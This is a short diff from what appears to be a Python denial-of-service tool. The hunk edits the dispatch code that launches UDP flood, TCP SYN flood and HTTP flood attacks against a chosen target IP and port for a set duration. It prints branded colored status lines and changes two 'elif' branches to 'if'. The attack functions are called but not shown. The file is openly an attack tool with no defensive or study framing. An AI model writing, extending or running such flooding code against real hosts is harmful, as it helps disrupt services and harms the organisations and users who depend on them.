@@ -114,11 +114,11 @@ if __name__ == "__main__":
         udp_attack(target_ip, target_port, duration)
         print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} UDP attack has on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")
     
-    elif attack_type == 'TCP':
+    if attack_type == 'TCP':
         tcp_syn_attack(target_ip, target_port, duration)
         print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} TCP SYN attack on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")
         
-    elif attack_type == 'HTTP':
+    if attack_type == 'HTTP':
         asyncio.run(http_flood_attack(target_ip, target_port, duration))
         print(f"{Fore.LIGHTYELLOW_EX}[{Fore.LIGHTRED_EX}sft'B4{Fore.LIGHTYELLOW_EX}]{Fore.LIGHTBLUE_EX} HTTP Flood attack started on {Fore.LIGHTGREEN_EX}{target_ip}:{target_port} {Fore.LIGHTBLUE_EX}duration {Fore.LIGHTGREEN_EX}{duration}")
         
